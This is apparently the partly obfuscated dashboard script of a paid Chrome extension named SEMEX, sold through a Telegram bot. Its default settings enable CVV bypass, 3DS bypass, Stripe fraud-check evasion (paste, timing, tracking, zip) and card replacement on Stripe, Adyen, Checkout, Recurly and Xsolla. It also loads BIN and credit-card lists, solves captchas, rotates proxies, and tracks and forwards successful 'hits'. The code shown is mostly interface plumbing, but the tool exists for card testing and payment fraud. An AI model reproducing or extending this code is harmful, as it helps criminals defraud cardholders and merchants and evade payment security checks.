var __defProp = Object.defineProperty;
var __defProps = Object.defineProperties;
var __getOwnPropDescs = Object.getOwnPropertyDescriptors;
var __getOwnPropSymbols = Object.getOwnPropertySymbols;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __propIsEnum = Object.prototype.propertyIsEnumerable;
var __defNormalProp = (_0x3751ba, _0x26a4bf, _0x4d747) => _0x26a4bf in _0x3751ba ? __defProp(_0x3751ba, _0x26a4bf, {
  enumerable: true,
  configurable: true,
  writable: true,
  value: _0x4d747
}) : _0x3751ba[_0x26a4bf] = _0x4d747;
var __spreadValues = (_0x44117a, _0x38b5cb) => {
  for (var _0x401bdb in _0x38b5cb ||= {}) {
    if (__hasOwnProp.call(_0x38b5cb, _0x401bdb)) {
      __defNormalProp(_0x44117a, _0x401bdb, _0x38b5cb[_0x401bdb]);
    }
  }
  if (__getOwnPropSymbols) {
    for (var _0x401bdb of __getOwnPropSymbols(_0x38b5cb)) {
      if (__propIsEnum.call(_0x38b5cb, _0x401bdb)) {
        __defNormalProp(_0x44117a, _0x401bdb, _0x38b5cb[_0x401bdb]);
      }
    }
  }
  return _0x44117a;
};
var __spreadProps = (_0x302032, _0xa16f20) => __defProps(_0x302032, __getOwnPropDescs(_0xa16f20));
var __name = (_0x4090da, _0x598e9f) => __defProp(_0x4090da, "name", {
  value: _0x598e9f,
  configurable: true
});
async function _parseResponse(_0x5e9d09) {
  if (!_0x5e9d09.ok) {
    try {
      const _0x519e9b = await _0x5e9d09.json();
      return {
        error: _0x519e9b.error || _0x519e9b.message || "HTTP Error " + _0x5e9d09.status,
        status: _0x5e9d09.status
      };
    } catch (_0x1833f0) {
      return {
        error: "HTTP Error " + _0x5e9d09.status,
        status: _0x5e9d09.status
      };
    }
  }
  if (window.serverClient && window.serverClient._handleResponse) {
    return await window.serverClient._handleResponse(_0x5e9d09);
  }
  return await _0x5e9d09.json();
}
__name(_parseResponse, "_parseResponse");
const DEFAULT_SETTINGS = {
  cvvBypass: {
    enabled: false,
    gateways: {
      stripe: true,
      adyen: true,
      checkout: true,
      recurly: true,
      xsolla: true
    }
  },
  paymentUserAgentBypass: {
    enabled: false
  },
  threeDSBypass: {
    enabled: true
  },
  bypassStripeZip: false,
  stripeSecurityBypass: {
    enabled: true,
    pasted: true,
    timing: true,
    tracking: true,
    zip: true
  },
  cardReplacement: {
    enabled: true,
    gateways: {
      stripe: true,
      adyen: true,
      checkout: true,
      recurly: true,
      xsolla: true
    }
  },
  binOrCCList: {
    mode: "bin",
    bin: "",
    cvv: "",
    ccList: "",
    expiry: {
      month: "RND",
      year: "RND"
    }
  },
  captchaSolving: {
    enabled: false,
    provider: "2captcha",
    hCaptcha: {
      enabled: true,
      tapBased: true,
      use2Captcha: true,
      fallbackToManual: true
    }
  },
  proxyManagement: {
    enabled: false,
    autoSaveLive: true,
    rotationMode: "sequential",
    rotationInterval: 5,
    proxies: []
  },
  paymentTracking: {
    enabled: true,
    gateways: {
      stripe: true,
      adyen: true,
      checkout: true,
      recurly: true,
      xsolla: true
    },
    showToast: true,
    onlySuccess: false,
    dismissTime: 5
  },
  screenshot: {
    saveLocally: true
  },
  celebration: {
    confetti: true,
    sound: true,
    volume: 100
  },
  formFilling: {
    enabled: true,
    customEmail: "",
    randomEmail: false,
    customName: "",
    randomName: false
  },
  addressFollowProxy: false,
  addressCountry: "US",
  addressCountryRandom: false
};
async function getSettings() {
  return new Promise(_0x4ff69b => {
    chrome.storage.local.get(["settings"], _0x28f693 => {
      _0x4ff69b(_0x28f693.settings || DEFAULT_SETTINGS);
    });
  });
}
__name(getSettings, "getSettings");
async function saveSettings(_0x35f3ff) {
  return new Promise(_0x21d7ac => {
    chrome.storage.local.set({
      settings: _0x35f3ff
    }, async () => {
      // ALSO sync to backend so settings follow user across devices.
      // v2.9.9: NEVER sync binOrCCList (BINs, CVV, full CC list) — card data
      // stays dashboard-local only (user requirement: temporary, not in DB).
      try {
        if (window.serverClient && window.serverClient.baseUrl) {
          const stored = await chrome.storage.local.get(["accessToken"]);
          if (stored.accessToken) {
            const _syncSafe = Object.assign({}, _0x35f3ff);
            delete _syncSafe.binOrCCList;
            fetch(window.serverClient.baseUrl + "/api/user/settings", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": "Bearer " + stored.accessToken,
                "X-Fingerprint": window.serverClient.fingerprint || "",
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "")
              },
              body: JSON.stringify({ settings: _syncSafe })
            }).catch(() => {});
          }
        }
      } catch (e) {}
      _0x21d7ac();
    });
  });
}
__name(saveSettings, "saveSettings");
async function setSetting(_0x47f421, _0x2c1cfd) {
  const _0x36809e = await getSettings();
  const _0xbc90fd = _0x47f421.split(".");
  let _0x2d5d0c = _0x36809e;
  for (let _0xcc4896 = 0; _0xcc4896 < _0xbc90fd.length - 1; _0xcc4896++) {
    if (!_0x2d5d0c[_0xbc90fd[_0xcc4896]]) {
      _0x2d5d0c[_0xbc90fd[_0xcc4896]] = {};
    }
    _0x2d5d0c = _0x2d5d0c[_0xbc90fd[_0xcc4896]];
  }
  _0x2d5d0c[_0xbc90fd[_0xbc90fd.length - 1]] = _0x2c1cfd;
  await saveSettings(_0x36809e);
}
__name(setSetting, "setSetting");
async function updateNopechaStatus() {
  const _0x4f3558 = document.getElementById("nopecha-status-badge");
  const _0x21a4ab = document.getElementById("nopecha-api-key").value.trim();
  if (!_0x21a4ab) {
    _0x4f3558.textContent = "Not Set";
    _0x4f3558.style.background = "#333";
    _0x4f3558.style.color = "#999";
    return;
  }
  _0x4f3558.textContent = "Checking...";
  _0x4f3558.style.background = "#555";
  _0x4f3558.style.color = "#fff";
  try {
    const _0x2704a1 = await chrome.runtime.sendMessage({
      type: "CHECK_NOPECHA_STATUS"
    });
    if (_0x2704a1.success) {
      _0x4f3558.textContent = _0x2704a1.credit + " credits";
      _0x4f3558.style.background = "#2e7d32";
      _0x4f3558.style.color = "#fff";
    } else {
      _0x4f3558.textContent = _0x2704a1.error || "Error";
      _0x4f3558.style.background = "#c62828";
      _0x4f3558.style.color = "#fff";
    }
  } catch (_0x25de58) {
    _0x4f3558.textContent = "Error";
    _0x4f3558.style.background = "#c62828";
    _0x4f3558.style.color = "#fff";
  }
}
__name(updateNopechaStatus, "updateNopechaStatus");
const NotificationManager = {
  notifications: [],
  add(_0x4ed0af, _0x54845b, _0x1ef2cf, _0x46dd35 = null) {
    const _0xa78e27 = {
      id: Date.now(),
      type: _0x4ed0af,
      title: _0x54845b,
      message: _0x1ef2cf,
      url: _0x46dd35,
      time: new Date().toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit"
      }),
      read: false
    };
    this.notifications.unshift(_0xa78e27);
    if (this.notifications.length > 10) {
      this.notifications.pop();
    }
    this.updateUI();
    this.animateBell();
  },
  clear() {
    this.notifications = [];
    this.updateUI();
  },
  updateUI() {
    const _0x2d8964 = document.getElementById("notif-badge");
    const _0x381222 = document.getElementById("notif-list");
    if (!_0x2d8964 || !_0x381222) {
      return;
    }
    const _0xdfad09 = this.notifications.filter(_0x454a63 => !_0x454a63.read).length;
    if (_0xdfad09 > 0) {
      _0x2d8964.textContent = _0xdfad09 > 9 ? "9+" : _0xdfad09;
      _0x2d8964.classList.remove("hidden");
    } else {
      _0x2d8964.classList.add("hidden");
    }
    if (this.notifications.length === 0) {
      _0x381222.innerHTML = "<div class=\"notif-empty\">No new notifications</div>";
    } else {
      _0x381222.innerHTML = this.notifications.map(_0x997e10 => "\n                <div class=\"notif-item " + (_0x997e10.read ? "" : "unread") + " " + (_0x997e10.url ? "clickable" : "") + "\" \n                     data-id=\"" + _0x997e10.id + "\" \n                     " + (_0x997e10.url ? "data-url=\"" + _0x997e10.url + "\"" : "") + ">\n                    <div class=\"notif-icon icon-" + _0x997e10.type + "\">" + this.getIcon(_0x997e10.type) + "</div>\n                    <div class=\"notif-content\">\n                        <div class=\"notif-title\">" + _0x997e10.title + " " + (_0x997e10.url ? "🔗" : "") + "</div>\n                        <div class=\"notif-msg\">" + _0x997e10.message + "</div>\n                        <div class=\"notif-time\">" + _0x997e10.time + "</div>\n                    </div>\n                </div>\n            ").join("");
      _0x381222.querySelectorAll(".notif-item[data-url]").forEach(_0x3ea222 => {
        _0x3ea222.addEventListener("click", () => {
          const _0x1132c7 = _0x3ea222.getAttribute("data-url");
          if (_0x1132c7) {
            window.open(_0x1132c7, "_blank");
          }
        });
      });
    }
  },
  getIcon(_0x175d2d) {
    const _0x445b2d = {
      success: "✅",
      warn: "⚠️",
      error: "🔴",
      info: "ℹ️"
    };
    return _0x445b2d[_0x175d2d] || "📢";
  },
  animateBell() {
    const _0x378bc8 = document.getElementById("notif-bell");
    if (_0x378bc8) {
      _0x378bc8.classList.add("has-notifications");
      setTimeout(() => _0x378bc8.classList.remove("has-notifications"), 600);
    }
  },
  markAllRead() {
    this.notifications.forEach(_0x118914 => _0x118914.read = true);
    this.updateUI();
  },
  toggleDropdown() {
    const _0x2eed94 = document.getElementById("notif-dropdown");
    if (_0x2eed94) {
      _0x2eed94.classList.toggle("hidden");
      if (!_0x2eed94.classList.contains("hidden")) {
        this.markAllRead();
      }
    }
  }
};
function updateFooterStatus(_0x2b9dbb, _0x3b51b2 = null) {
  const _0x4d4335 = document.getElementById("sys-dot");
  const _0x1c32ca = document.getElementById("sys-text");
  if (!_0x4d4335 || !_0x1c32ca) {
    return;
  }
  _0x4d4335.className = "sys-dot";
  _0x4d4335.classList.add("status-" + _0x2b9dbb);
  const _0x2d3783 = {
    connected: "System Connected",
    offline: "Server Unreachable",
    banned: "Account Banned",
    expired: "Subscription Expired",
    free: "Free Plan Active",
    premium: "Premium Plan Active",
    paid: "Paid Plan (VIP) Active",
    mismatch: "Device Mismatch"
  };
  _0x1c32ca.textContent = _0x3b51b2 || _0x2d3783[_0x2b9dbb] || "Unknown Status";
  if (_0x2b9dbb === "connected" || _0x2b9dbb === "free") {
    _0x1c32ca.style.color = "#aaa";
  } else if (_0x2b9dbb === "premium") {
    _0x1c32ca.style.color = "#c084fc";
  } else if (_0x2b9dbb === "paid") {
    _0x1c32ca.style.color = "#fbbf24";
  } else {
    _0x1c32ca.style.color = "#f59e0b";
  }
}
__name(updateFooterStatus, "updateFooterStatus");
function initNotificationCenter() {
  const _0x540051 = document.getElementById("notif-bell");
  if (_0x540051) {
    _0x540051.addEventListener("click", _0x20ef66 => {
      _0x20ef66.stopPropagation();
      NotificationManager.toggleDropdown();
    });
  }
  const _0x57e81d = document.getElementById("notif-clear-all");
  if (_0x57e81d) {
    _0x57e81d.addEventListener("click", () => NotificationManager.clear());
  }
  document.addEventListener("click", _0x34dfe6 => {
    const _0x1d5166 = document.getElementById("notif-dropdown");
    const _0x9403e6 = document.getElementById("notif-bell");
    if (_0x1d5166 && !_0x1d5166.contains(_0x34dfe6.target) && !_0x9403e6.contains(_0x34dfe6.target)) {
      _0x1d5166.classList.add("hidden");
    }
  });
  updateFooterStatus("connected");
}
__name(initNotificationCenter, "initNotificationCenter");
function hideElement(_0x4b07a9) {
  if (_0x4b07a9) {
    _0x4b07a9.classList.add("hidden");
  }
}
__name(hideElement, "hideElement");
function showElement(_0x1a4a5f, _0x2a2972 = "block") {
  if (_0x1a4a5f) {
    _0x1a4a5f.classList.remove("hidden");
    if (_0x2a2972) {
      _0x1a4a5f.style.display = _0x2a2972;
    }
  }
}
__name(showElement, "showElement");
function showMaintenanceOverlay(_0x56a0f6 = null) {
  const _0x1467e7 = document.getElementById("maintenance-overlay");
  const _0x23b3d7 = document.getElementById("maintenance-message");
  if (_0x1467e7) {
    _0x1467e7.classList.remove("hidden");
    if (_0x56a0f6 && _0x23b3d7) {
      _0x23b3d7.textContent = _0x56a0f6;
    }
  }
}
__name(showMaintenanceOverlay, "showMaintenanceOverlay");
function hideMaintenanceOverlay() {
  const _0x961e79 = document.getElementById("maintenance-overlay");
  if (_0x961e79) {
    _0x961e79.classList.add("hidden");
  }
}
__name(hideMaintenanceOverlay, "hideMaintenanceOverlay");
async function checkMaintenanceMode() {
  if (!window.serverClient) {
    return false;
  }
  try {
    const _0x39bf1f = await window.serverClient.verifySession();
    if (_0x39bf1f && _0x39bf1f.error && _0x39bf1f.type === "MAINTENANCE") {
      showMaintenanceOverlay(_0x39bf1f.message);
      return true;
    }
    return false;
  } catch (_0x272ef2) {
    return false;
  }
}
__name(checkMaintenanceMode, "checkMaintenanceMode");
function initMaintenanceRetry() {
  const _0x4fea0a = document.getElementById("maintenance-retry-btn");
  if (_0x4fea0a) {
    _0x4fea0a.addEventListener("click", async () => {
      _0x4fea0a.textContent = "⏳ Checking...";
      _0x4fea0a.disabled = true;
      const _0x17477e = await checkMaintenanceMode();
      if (!_0x17477e) {
        hideMaintenanceOverlay();
        location.reload();
      } else {
        _0x4fea0a.textContent = "🔄 Retry";
        _0x4fea0a.disabled = false;
      }
    });
  }
}
__name(initMaintenanceRetry, "initMaintenanceRetry");
async function loadAnnouncement() {
  try {
    if (!window.serverClient || !window.serverClient.baseUrl) {
      return;
    }
    if (!window.serverClient.fingerprint) {
      return;
    }
    let _0x3c114f = null;
    if (window.cacheManager) {
      try {
        const _0x41980f = await window.cacheManager.get("announcement", {
          strategy: "local"
        });
        if (_0x41980f) {
          const _0x6e8ddc = localStorage.getItem("dismissedAnnouncement");
          if (_0x6e8ddc !== _0x41980f) {
            showAnnouncementBanner(_0x41980f);
            _0x3c114f = _0x41980f;
          }
        }
      } catch (_0x10c0f3) {}
    }
    const _0x520d15 = await fetch(window.serverClient.baseUrl + "/api/site-config", {
      headers: {
        "X-Fingerprint": window.serverClient.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "")
      }
    });
    if (!_0x520d15.ok) {
      return;
    }
    const _0x57d54e = await _parseResponse(_0x520d15);
    if (_0x57d54e.success && _0x57d54e.config && _0x57d54e.config.announcement) {
      const _0x265217 = _0x57d54e.config.announcement.trim();
      if (_0x265217) {
        if (window.cacheManager) {
          try {
            await window.cacheManager.set("announcement", _0x265217, {
              strategy: "local",
              ttl: 10800000
            });
          } catch (_0x4e5e9c) {}
        }
        const _0x2e0d44 = localStorage.getItem("dismissedAnnouncement");
        if (_0x2e0d44 === _0x265217) {
          return;
        }
        if (_0x265217 !== _0x3c114f) {
          showAnnouncementBanner(_0x265217);
        }
      }
    }
  } catch (_0x4788e9) {}
}
__name(loadAnnouncement, "loadAnnouncement");
function showAnnouncementBanner(_0x194760) {
  const _0x10c72e = document.getElementById("announcement-banner");
  const _0xdd1663 = document.getElementById("announcement-text");
  if (_0x10c72e && _0xdd1663) {
    _0xdd1663.textContent = _0x194760;
    _0x10c72e.classList.remove("hidden");
  }
}
__name(showAnnouncementBanner, "showAnnouncementBanner");
function initAnnouncementBanner() {
  const _0x5535db = document.getElementById("announcement-dismiss");
  const _0xb0633 = document.getElementById("announcement-text");
  const _0x3cd18c = document.getElementById("announcement-banner");
  if (_0x5535db) {
    _0x5535db.addEventListener("click", () => {
      const _0x225f54 = _0xb0633 ? _0xb0633.textContent : "";
      localStorage.setItem("dismissedAnnouncement", _0x225f54);
      if (_0x3cd18c) {
        _0x3cd18c.classList.add("hidden");
      }
    });
  }
}
__name(initAnnouncementBanner, "initAnnouncementBanner");
async function loadNewsFeed() {
  const _0x26c59c = document.getElementById("news-list");
  if (!_0x26c59c) {
    return;
  }
  // Stale-while-revalidate: paint cached news instantly, then refresh in the background.
  let _hasCached = false;
  try {
    if (window.cacheManager) {
      const _0x57164d = await window.cacheManager.get("news_feed", {
        strategy: "local"
      });
      if (_0x57164d && _0x57164d.length) {
        renderNewsList(_0x57164d);
        _hasCached = true;
      }
    }
  } catch (_e) {}
  try {
    if (!_hasCached) {
      _0x26c59c.innerHTML = "<div class=\"news-loading\">Loading news…</div>";
    }
    if (!window.serverClient || !window.serverClient.baseUrl) {
      if (!_hasCached) _0x26c59c.innerHTML = "<div class=\"news-empty\">Cannot connect to server</div>";
      return;
    }
    const _0x36b0ae = await fetch(window.serverClient.baseUrl + "/api/news", {
      headers: {
        "X-Fingerprint": window.serverClient.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "")
      }
    });
    const _0x404b88 = await _parseResponse(_0x36b0ae);
    // Backend returns { items: [{id,title,body,important,created_at}] }.
    // Normalise to the shape renderNewsList expects.
    const _rawItems = (_0x404b88 && (_0x404b88.items || _0x404b88.news)) || [];
    const _news = _rawItems.map((it) => ({
      id: it.id || it._id || "",
      title: it.title || "",
      content: it.content || it.body || "",
      pinned: it.pinned != null ? it.pinned : !!it.important,
      type: (it.important || it.type === "alert") ? "alert" : (it.type || "news"),
      createdAt: it.createdAt || it.created_at || Date.now()
    }));
    if (_news.length > 0) {
      if (window.cacheManager) {
        await window.cacheManager.set("news_feed", _news, {
          strategy: "local",
          ttl: 3600000
        });
      }
      renderNewsList(_news);
    } else if (!_hasCached) {
      _0x26c59c.innerHTML = "<div class=\"news-empty\"><span class=\"empty-icon\">📭</span>No news yet</div>";
    }
  } catch (_0x1a0a45) {
    if (!_hasCached) _0x26c59c.innerHTML = "<div class=\"news-empty\"><span class=\"empty-icon\">⚠️</span>Failed to load news</div>";
  }
}
__name(loadNewsFeed, "loadNewsFeed");
function initRedeemCode() {
  const _0x5bb2ba = document.getElementById("redeem-code-input");
  const _0x15e78b = document.getElementById("redeem-code-btn");
  const _0x2222d7 = document.getElementById("redeem-status");
  if (!_0x15e78b || !_0x5bb2ba) {
    return;
  }
  _0x15e78b.addEventListener("click", async () => {
    const _0x4adeda = _0x5bb2ba.value.trim().toUpperCase();
    if (!_0x4adeda) {
      showRedeemStatus("Please enter a code", "error");
      return;
    }
    _0x15e78b.disabled = true;
    _0x15e78b.textContent = "⏳...";
    try {
      if (!window.serverClient || !window.serverClient.baseUrl) {
        throw new Error("Server not connected");
      }
      const _0x130182 = await window.serverClient.redeemCode(_0x4adeda);
      if (_0x130182 && _0x130182.success) {
        showRedeemStatus(_0x130182.message || "Code redeemed! Access activated.", "success");
        _0x5bb2ba.value = "";
        setTimeout(() => location.reload(), 2000);
      } else {
        showRedeemStatus((_0x130182 && _0x130182.message) || "Failed to redeem code", "error");
      }
    } catch (_0x48a8f) {
      showRedeemStatus("Failed to connect to server", "error");
    } finally {
      _0x15e78b.disabled = false;
      _0x15e78b.textContent = "Redeem";
    }
  });
  _0x5bb2ba.addEventListener("input", _0x2422f8 => {
    let _0x4ca8cc = _0x2422f8.target.value.toUpperCase().replace(/[^A-Z0-9-]/g, "");
    _0x2422f8.target.value = _0x4ca8cc;
  });
}
__name(initRedeemCode, "initRedeemCode");
function showRedeemStatus(_0x870a1, _0x4779af) {
  const _0x38d2b0 = document.getElementById("redeem-status");
  if (_0x38d2b0) {
    _0x38d2b0.textContent = _0x870a1;
    _0x38d2b0.className = "redeem-status " + _0x4779af;
    _0x38d2b0.classList.remove("hidden");
  }
}
__name(showRedeemStatus, "showRedeemStatus");
function toggleSectionContent(_0x5bdaef, _0x2730ea) {
  const _0x4c3d55 = document.getElementById(_0x5bdaef);
  if (_0x4c3d55) {
    if (_0x2730ea) {
      showElement(_0x4c3d55, "block");
    } else {
      hideElement(_0x4c3d55);
    }
  }
}

// ─────────────────────────────────────────────────────────────
// Premium-gate helpers — 3DS Bypass and other paid features
// ─────────────────────────────────────────────────────────────
function _semexHasPremiumOrAdmin() {
  try {
    const p = (window._semexUserPlan || "").toUpperCase();
    const isAdmin = !!window._semexIsAdmin;
    // Premium = any paid plan that isn't TRIAL. Admins always pass.
    return isAdmin || (p && p !== "TRIAL" && p !== "EXPIRED" && p !== "FREE" && p !== "");
  } catch (_e) { return false; }
}
function _semexShowPremiumLock(featureName) {
  const bh = (window._semexBotHandle || "SemexBot").replace(/^@/, "");
  const msg = "🔒 " + (featureName || "This feature") + " is a Premium-only feature.\n\n" +
    "Upgrade to MONTHLY / YEARLY / LIFETIME by running /buy in @" + bh + " on Telegram.";
  if (typeof window.showAlert === "function") {
    window.showAlert("Premium Only", msg);
  } else if (typeof _toast === "function") {
    _toast(msg, "error");
  } else {
    alert(msg);
  }
}
function _semexApplyPremiumGates() {
  // 3DS Bypass toggle — lock badge + toggle disabled + expandable info swapped
  const lockBadge = document.getElementById("three-ds-bypass-lock");
  const toggle = document.getElementById("three-ds-bypass-toggle");
  const content = document.getElementById("three-ds-bypass-content");
  const lockedNote = document.getElementById("three-ds-bypass-locked-note");
  const botHandle = document.getElementById("three-ds-bot-handle");
  if (botHandle && window._semexBotHandle) botHandle.textContent = String(window._semexBotHandle).replace(/^@/, "");
  const hasAccess = _semexHasPremiumOrAdmin();
  if (lockBadge) lockBadge.style.display = hasAccess ? "none" : "inline-block";
  if (toggle) toggle.disabled = !hasAccess;
  if (!hasAccess) {
    // Force OFF for free users on load
    if (toggle && toggle.checked) {
      toggle.checked = false;
      try { setSetting("threeDSBypass.enabled", false); } catch (_e) {}
    }
    if (content) content.classList.add("hidden");
    if (lockedNote) lockedNote.style.display = "block";
  } else {
    if (lockedNote) lockedNote.style.display = "none";
  }
}


__name(toggleSectionContent, "toggleSectionContent");

// ─────────────────────────────────────────────────────────────
// Extension version enforcement — the API refuses hits from old
// builds and returns HTTP 426. We also pre-check on startup so a
// user knows to update BEFORE they try to run a hit.
// ─────────────────────────────────────────────────────────────
function _semexParseVer(v) {
  if (!v) return [0];
  return String(v).split(".").slice(0, 4).map(p => parseInt(String(p).replace(/[^0-9]/g, ""), 10) || 0);
}
function _semexCmpVer(a, b) {
  const A = _semexParseVer(a), B = _semexParseVer(b);
  const n = Math.max(A.length, B.length);
  for (let i = 0; i < n; i++) {
    const av = A[i] || 0, bv = B[i] || 0;
    if (av !== bv) return av - bv;
  }
  return 0;
}
async function _semexCheckExtensionVersion() {
  try {
    const localVer = (chrome && chrome.runtime && chrome.runtime.getManifest) ? (chrome.runtime.getManifest().version || "0.0.0") : "0.0.0";
    const base = (window.serverClient && window.serverClient.baseUrl) || "";
    if (!base) return;
    const r = await fetch(base + "/api/public/version", { cache: "no-store" });
    if (!r.ok) return;
    const info = await r.json();
    try { window._semexBotHandle = info.botUsername || "SemexBot"; } catch (_e) {}
    const minV = info && info.minVersion || "0.0.0";
    const latestV = info && info.latestVersion || minV;
    if (_semexCmpVer(localVer, minV) < 0) {
      const payload = {
        required: true,
        sentVersion: localVer,
        minVersion: minV,
        latestVersion: latestV,
        downloadUrl: info.downloadUrl || "",
        botLink: info.botLink || "",
        botCommand: info.botCommand || "/get",
        botUsername: info.botUsername || "",
        message: info.message || ("Update required to v" + minV),
        detectedAt: Date.now(),
      };
      try { await chrome.storage.local.set({ __xugr: payload }); } catch (_e) {}
      _semexShowUpgradeModal(payload);
    } else {
      try { await chrome.storage.local.remove("__xugr"); } catch (_e) {}
      _semexRemoveUpgradeModal();
    }
  } catch (_e) { /* silent — will be caught server-side on next hit */ }
}
// TRUE only when the installed build is genuinely BELOW the required minimum.
// Guards every modal trigger so a stale cached flag or a false-positive 426
// (e.g. a request that momentarily lacked the X-Extension-Version header)
// can never hard-block a build that actually satisfies the requirement.
function _semexIsGenuinelyOutdated(minV) {
  try {
    const localVer = (chrome && chrome.runtime && chrome.runtime.getManifest)
      ? (chrome.runtime.getManifest().version || "0.0.0") : "0.0.0";
    if (!minV) return false; // no known minimum → never block
    return _semexCmpVer(localVer, minV) < 0;
  } catch (_e) { return false; }
}
function _semexShowUpgradeModal(info) {
  // Final safety gate: refuse to render the block unless the install is truly
  // older than the required minimum. Clears any stale flag so it can't re-fire.
  if (!_semexIsGenuinelyOutdated(info && info.minVersion)) {
    try { chrome.storage.local.remove("__xugr"); } catch (_e) {}
    _semexRemoveUpgradeModal();
    return;
  }
  if (document.getElementById("semex-upgrade-block")) return;
  const localVer = (chrome && chrome.runtime && chrome.runtime.getManifest) ? chrome.runtime.getManifest().version : "?";
  const overlay = document.createElement("div");
  overlay.id = "semex-upgrade-block";
  overlay.setAttribute("data-testid", "upgrade-required-modal");
  overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(6,4,14,0.97);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;padding:20px;font-family:'Segoe UI',system-ui,sans-serif;pointer-events:auto;overflow:auto;";
  // Lock the underlying popup: no scroll, no interactions, no keyboard escapes.
  try {
    document.documentElement.style.overflow = "hidden";
    if (document.body) document.body.style.overflow = "hidden";
    // Absorb Escape/Tab so keyboard can't tab through to the frozen dashboard.
    if (!window._semexUpgradeKeyBlocker) {
      window._semexUpgradeKeyBlocker = (e) => {
        if (document.getElementById("semex-upgrade-block")) {
          if (e.key === "Escape" || e.key === "Tab") { e.preventDefault(); e.stopPropagation(); }
        }
      };
      document.addEventListener("keydown", window._semexUpgradeKeyBlocker, true);
    }
  } catch (_e) {}
  const dl = info.downloadUrl ? String(info.downloadUrl).replace(/"/g, "&quot;") : "";
  const bot = info.botLink ? String(info.botLink).replace(/"/g, "&quot;") : "";
  const botUser = info.botUsername ? String(info.botUsername).replace(/</g, "&lt;") : "SemexBot";
  overlay.innerHTML =
    '<div style="max-width:420px;width:100%;background:linear-gradient(135deg,rgba(50,20,80,0.65),rgba(30,10,50,0.9));border:1px solid rgba(255,120,200,0.4);border-radius:20px;padding:26px 24px;box-shadow:0 20px 60px rgba(0,0,0,0.5);color:#fff;text-align:center;">' +
      '<div style="font-size:48px;line-height:1;margin-bottom:10px;">⚠️</div>' +
      '<h2 style="margin:0 0 6px 0;font-size:1.35rem;background:linear-gradient(135deg,#ff9dcc,#c8a4ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">Update Required</h2>' +
      '<div style="color:rgba(255,255,255,0.7);font-size:0.85rem;margin-bottom:14px;">Your SEMEX extension is out of date.</div>' +
      '<div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:0.82rem;line-height:1.5;">' +
        '<div style="display:flex;justify-content:space-between;"><span style="color:rgba(255,255,255,0.55);">Installed</span><span style="font-family:ui-monospace,monospace;color:#ff9aa8;">v' + localVer + '</span></div>' +
        '<div style="display:flex;justify-content:space-between;margin-top:4px;"><span style="color:rgba(255,255,255,0.55);">Required</span><span style="font-family:ui-monospace,monospace;color:#6bffb8;">v' + (info.minVersion || "?") + '</span></div>' +
        (info.latestVersion && info.latestVersion !== info.minVersion ? '<div style="display:flex;justify-content:space-between;margin-top:4px;"><span style="color:rgba(255,255,255,0.55);">Latest</span><span style="font-family:ui-monospace,monospace;color:#c8a4ff;">v' + info.latestVersion + '</span></div>' : '') +
      '</div>' +
      '<p style="font-size:0.82rem;color:rgba(255,255,255,0.75);margin:0 0 18px 0;line-height:1.4;">' + (info.message || "Please update your extension to continue using SEMEX.") + '</p>' +
      (dl ? '<a id="semex-upgrade-dl" href="' + dl + '" target="_blank" rel="noopener" data-testid="upgrade-download-btn" style="display:block;text-align:center;padding:12px 18px;background:linear-gradient(135deg,#8b5cf6,#c8a4ff);color:#fff;border-radius:10px;text-decoration:none;font-weight:700;letter-spacing:0.4px;margin-bottom:10px;box-shadow:0 6px 20px rgba(139,92,246,0.35);">⬇ Download New Version</a>' : '') +
      (bot ? '<a id="semex-upgrade-bot" href="' + bot + '" target="_blank" rel="noopener" data-testid="upgrade-bot-btn" style="display:block;text-align:center;padding:10px 18px;background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.15);border-radius:10px;text-decoration:none;font-weight:600;font-size:0.85rem;">Or open @' + botUser + ' → send <code style="background:rgba(0,0,0,0.4);padding:2px 6px;border-radius:4px;font-family:ui-monospace,monospace;">' + (info.botCommand || "/get") + '</code></a>' : '') +
      '<div style="margin-top:14px;font-size:0.7rem;color:rgba(255,255,255,0.35);">Hits will not be forwarded to Telegram until you update.</div>' +
    '</div>';
  document.body.appendChild(overlay);
}
function _semexRemoveUpgradeModal() {
  const el = document.getElementById("semex-upgrade-block");
  if (el && el.parentNode) el.parentNode.removeChild(el);
  try {
    document.documentElement.style.overflow = "";
    if (document.body) document.body.style.overflow = "";
    if (window._semexUpgradeKeyBlocker) {
      document.removeEventListener("keydown", window._semexUpgradeKeyBlocker, true);
      window._semexUpgradeKeyBlocker = null;
    }
  } catch (_e) {}
}
// Listen for background.js broadcast (fired when a hit gets a 426).
try {
  if (chrome && chrome.runtime && chrome.runtime.onMessage) {
    chrome.runtime.onMessage.addListener((msg) => {
      if (msg && msg.type === "SEMEX_UPGRADE_REQUIRED" && msg.info) {
        _semexShowUpgradeModal(msg.info);
      }
    });
  }
} catch (_e) {}

// GLOBAL 426 catcher — wraps fetch so ANY API call (admin panel, user hits,
// state sync, news, BINs, etc.) that returns Upgrade Required immediately
// shows the hard-block modal. This is what actually locks old extensions
// out completely — not just during hit submits.
(function _semexWrapFetchFor426() {
  if (window._semexFetchWrapped) return;
  window._semexFetchWrapped = true;
  const _origFetch = window.fetch.bind(window);
  window.fetch = async function (input, init) {
    const resp = await _origFetch(input, init);
    try {
      if (resp && resp.status === 426) {
        const cloned = resp.clone();
        let payload = null;
        try { payload = await cloned.json(); } catch (_e) {}
        const det = (payload && (payload.detail || payload)) || {};
        const info = {
          required: true,
          sentVersion: det.sentVersion || "",
          minVersion: det.minVersion || "",
          latestVersion: det.latestVersion || det.minVersion || "",
          downloadUrl: det.downloadUrl || "",
          botLink: det.botLink || "",
          botCommand: det.botCommand || "/get",
          botUsername: det.botUsername || "",
          message: det.message || "Please update your SEMEX extension.",
